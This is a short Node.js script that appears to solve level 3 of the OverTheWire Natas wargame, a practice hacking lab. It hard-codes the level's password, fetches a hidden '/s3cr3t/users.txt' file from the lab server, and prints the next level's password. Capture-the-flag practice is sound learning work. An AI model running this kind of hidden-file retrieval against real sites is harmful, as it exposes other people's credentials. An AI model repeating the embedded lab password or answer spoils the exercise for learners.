const http = require('http');
const fs = require('fs');

let username = 'natas3';
let password = 'sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14';
let options = {
    host: `${username}.natas.labs.overthewire.org`,
    path: '/s3cr3t/users.txt',
    method: 'GET',
    auth: `${username}:${password}`,
}

let request = http.request(options, (res) => {
    res.setEncoding('utf8');
    res.on('data', data => {
        //fs.writeFile('index.html', data);
        console.log(data.match(/([0-9]|[a-zA-Z]){32}/g).filter(e => e != password)[0]);
    });
});

request.on('error', error => {
    console.log(error)
});

request.end();